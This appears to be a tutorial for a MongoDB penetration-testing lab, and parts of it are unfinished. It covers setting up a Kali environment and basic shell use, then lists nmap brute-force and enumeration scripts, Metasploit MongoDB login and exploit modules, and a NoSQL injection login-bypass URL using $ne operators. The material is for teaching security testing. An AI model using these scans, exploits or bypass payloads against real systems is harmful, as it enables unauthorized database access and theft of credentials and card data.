#Mongodb Hacking#

```
1. Introduction and Lab Setup.
   1.1 What is MongoDB ?
   1.2 How about Security ?
   1.3 Installing MongoDB in Kali
   1.4 Playing with Mongo Shell
       1.4.1 Creating a database
       1.4.2 Checking current database
       1.4.3 Checking the list of databases
       1.4.4 Inserting data into collections
       1.4.5 Querying a document
       1.4.6 Writing Conditions while querying data
       1.4.7 Deleting Documents
       1.4.8 Dropping a collection
       1.4.9 Dropping a database
   1.5 Lab Setup

2. Vulnerability Assessment
   2.1 Introduction
   2.2 Scanning for open ports
   2.3 Service enumeration
   2.4 Scanning for http-interface
   2.5 Accessing HTTP Interface
   2.6 Scanning with nmap NSE scripts
   2.7 mongodb-brute
   2.8 mongodb-databases
   2.9 Metasploit Auxiliary Module
   2.10 Exploitation

3. Attacking Applications
   3.1 Introduction

4. Automated Assessments
   4.1 Getting NoSQLMap ready
   4.2 NoSQL DB Access Attacks
   4.3 Scanning for anonymous MongoDB access
   4.4 NoSQL Injection using NoSQLMao
```

----

##Introduction and Lab Setup##

###What is Mongodb?###

MongoDB is an open source schema less document oriented database system developed using C++. MongoDB is one of the leading NoSQL database solutions.  
  
In MongoDB, data is stored in the form of JSON style document.  

Some of the major features of MongoDB:  
  
  - Document Based
  - High performance
  - HIgh Availability
  - Easy Scalability
  - No Complex Joins


###How about Security?###

With the growing use of NoSQL databases, security should be considered seriously. Just like any other system, the security of MongoDB is not a single-handed job. Everyone in the ecosystem is responsible for it. Even through MongoDB comes with some inbuilt security features, it is possible to have vulnerabilities in the production due to various reasons such as misconfigurations, no updates, poor programming etc.

###Installing MongoDB in Kali###

Run the sudo apt-get update command.  

This command downloads the package lists from the repositories and updates them to get information on the newest version of the packages and their dependencies.

This step may take some time and provides a large output on the screen, so the output is truncated.

```
root:~ /# apt-get install mongodb
``` 

Create a directory "/data/db" under root folder. Make sure that "/data/db" is dieectly under the "/" root directory, we need to create this directory as root.

```
root:~ /# mkdir -p /data/db
```

Once we have completed the previous steps, we can start  a MongoDB instance with the following command:

```
root:~ /# service mongodb start
```

This will start the MongoDB instance with the default features. After lanuching the MongoDB instance, we cross check to see if it is up and running by locking at the console messages.  

If we see the message below in the console, it is running fine.  

```
root:~ /# service mongodb status
[ ok ] Checking status of database: mongodb running.
```

Note: As mentioned earlier, MongoDB by default runs with limited features. For peneration testing lab purposes, use the following steps to start the MongoDB instance.  

Launch MongoDB with the following command  

```
root:~ /# mongod -httpinterface -reset -smallfiles
```

run the following command to connect to the mongod server, which is started already.  

```
root:~ /# mongo
MongoDB shell version: 2.0.6
connecting to: test
> 
```

Note: if you get any erros, please solve the problem yourself, and everything should work fine.  

----

###Playing with Mongo Shell###

In the previous sections, we have seen a brief introduction to MongoDB and its setup. It's time to play with the shell and execute few commands on the MongoDB to get better accquainted with MongoDB and its working.  

MongoDB uses Javascript style queries and thus we feel like running Javascript code most of the time.  

Though we don't discuss all the commands associated with MongoDB, this section gives a brief idea of how MongoDB works.  

Before we proceed, there are few terms to understand.  
  
  - MongoDB holds "databases"
  - Each database contains one or more "collections".
  - Each collection holds one or more "documents:.

Now, let's proceed to run the MongoDB commands

####Creating a database####

The following command will create a new database if doesn't exist. If the database already exists, it uses it.

Let's create a database with the name "testdb".  

```
> show dbs
customers   (empty)
local   (empty)
sample  0.0625GB
shop    (empty)
test    (empty)
> use sample
switched to db sample
```

####Checking current database####

We can use the command "db" to check the current database. Let;s run the command "db" to check the current database. 

```
> db
sample
```

####Checking the list of databases####

"show dbs" is the command to list the databases available.

```
> show dbs                                                
customers   (empty)                                       
local   (empty)                                           
sample  0.0625GB                                          
shop    (empty)                                           
test    (empty) 
```

If you notice the above output, it didn't list the database we just created.  

The reason is that it requires at least one document inside it.

####Inserting data into collections####

If we insert one or more documents inside it, we can see the database listed.

```
> db.demo.insert({"username":"superman"})
> db.demo.insert({"username":"spiderman"})
> db.demo.insert({"username":"flashman"})
```

By default, we don't need to explicitly create collections in a database (We can do so if we want). We can directly use a non-existent collection name to insert data. MongoDB will automaticallly create it.

If we now list databases, we can see our current databases.

```
> show collections
demo
products
system.indexes
users
```

####Querying a document####

In order to query data from a MongoDB collection, we can use find() method as shown below.  

```
> db.demo.find()
{ "_id" : ObjectId("55d69dda4b497930a32f3444"), "username" : "superman" }
{ "_id" : ObjectId("55d69de14b497930a32f3445"), "username" : "spiderman" }
{ "_id" : ObjectId("55d69de64b497930a32f3446"), "username" : "flashman" }
```

####Writing Conditions while querying data####

We can also write conditions on queries similar to RDBMS conditions with MongoDB specfic syntax.  
Currently, my collection has two documents.

```
> db.demo.find()
{ "_id" : ObjectId("55d69dda4b497930a32f3444"), "username" : "superman" }
{ "_id" : ObjectId("55d69de14b497930a32f3445"), "username" : "spiderman" }
{ "_id" : ObjectId("55d69de64b497930a32f3446"), "username" : "flashman" }
```

If I want to retrieve only one document based on matching a specific username, we can do it as shown below. 

```
> db.demo.find({"username":"spiderman"})
{ "_id" : ObjectId("55d69de14b497930a32f3445"), "username" : "spiderman" }
```

####Deleting Documents####

We can use remove() method to delete documents from a collection based on a specific condition.

```
> db.demo.remove({"username": "flashman"})
> db.demo.find()
{ "_id" : ObjectId("55d69dda4b497930a32f3444"), "username" : "superman" }
{ "_id" : ObjectId("55d69de14b497930a32f3445"), "username" : "spiderman" }
```

The above query removes the document where the key "username" has the value "flashman".

####Dropping a collection####

We can drop a collection as shown below.

```
> db.demo.drop()
true
```

####Droppong a database####

We can drpo a database as shown below.

```
> db.dropDatabase()
{ "dropped" : "sample", "ok" : 1 }
```

The above command has dropped the database 'sample' that we created.  

This is how we can run commands on MongoDB using a mongo shell.  

The idea behind showing these commands is not to make you a MongoDB master, but to give a basic idea of how MongoDB functions if you are an absolute beginner.


----

###Lab Setup###

We need to have the following setup to follow the practical demonstrations shown in this book.

```
             ----------------
             |              |
             |     Kali     |
             |              |
             |   [MongoDB]  |
             |              |
             ----------------
```

As we can see in the above figure, we need to install Kali Linux. Make sure that you have "Host Only Adapter" under adapter 1 of your network settings for both the machines as shown below.

Note: We will also setup a PHP Web Application later in this section. So, please use the same names as I am using to create database and collections. It is required for the PHP Web application to work. If you change these names, you may need to change the PHP web application accordingly.  

####Create a new database####

Get the mongo shell and create a new database called "sample" by running the following command in the mongo shell.  

```
> use sample
switched to db sample
```

This command will switch the user to the database "sample" if it already exists. If the database doesn't exist, it will create a new one.

####Insert data####

Run the following command in mongo shell in order to insert test data into the collection "users".

```
> db.users.insert({"username": "tom", "password": "tom", "email": "tom@gmail.com", "cardnumber": 12345})
> db.users.insert({"username": "jim", "password": "jim", "email": "jim@gmail.com", "cardnumber": 54321})
> db.users.insert({"username": "bob", "password": "bob", "email": "bob@gmail.com", "cardnumber": 22222})
```

Similarly execute the following commands

```
> db.products.insert({"email": "tom@gmail.com", "prodname": "laptop", "price": "1500USC"})
> db.products.insert({"email": "jim@gmail.com", "prodname": "book", "price": "50USC"})
> db.products.insert({"email": "bob@gmail.com", "prodname": "diamondring", "price": "4500USC"})
```

####Installing the PHP driver for mongo####

In order for the PHP web application to work with MongoDB, we need to install the PHP driver.

```
sudo apt-get install php-pear php5-dev
sudo pecl install mongo
```

####Installing PHP Web application####

Once after done with the installation of PHP driver, we need to install the PHP web application. Download the PHP code from HERE.  

This files is named as mongo.zip and looks as shown below.  


----

##Vulnerability Assessment##

```
nmap -p 27017 <ipaddress>
nmap -p 27017 -sV <ipaddress>
nmap -p 27017 --script mongodb-brute <ipadress>
nmap -p 27017 --script mongodb-databases <ipaddress>

msf > use auxiliary/scanner/mongodb/mongodb_login
msf > use auxiliary/gather/mongodb_js_inject_collection_enum
msf > use exploit/linux/misc/mongod_native_helper

nmap -p 28017 <ipaddress>
nmap -p 28017 -sV <ipaddress>

http://<ipaddress>:28017/

```

----
##Attacking Applications##

```
> db.users.find({"username":"jim", "password": {$ne: "0x00"}})
{ "_id" : ObjectId("55d5d719d60515e316247247"), "username" : "jim", "password" : "jim", "email" : "jim@gmail.com", "cardnumber" : 54321 }
```

If you notice, the above MongoDB command is fetching all the documents where the username is "jim" and password not equals to "0x00".

```
> db.users.find({"username": {$ne: "0x00"}, "password": {$ne: "0x00"}})
{ "_id" : ObjectId("55d5d6f2d60515e316247246"), "username" : "tom", "password" : "tom", "email" : "tom@gmail.com", "cardnumber" : 12345 }
{ "_id" : ObjectId("55d5d719d60515e316247247"), "username" : "jim", "password" : "jim", "email" : "jim@gmail.com", "cardnumber" : 54321 }
{ "_id" : ObjectId("55d5d739d60515e316247248"), "username" : "bob", "password" : "bob", "email" : "bob@gmail.com", "cardnumber" : 22222 }
```

This time, we are able to see all the documents that do not meet the condition username and password as "jim".

```
http://localhost/index.php?username[$ne]=test&password[$ne]=test
```


----
##Automated Assessments##

We are going to use a very nice tool called NoSQLMap for this part.

http://github.com/tcstool/nosqlmap


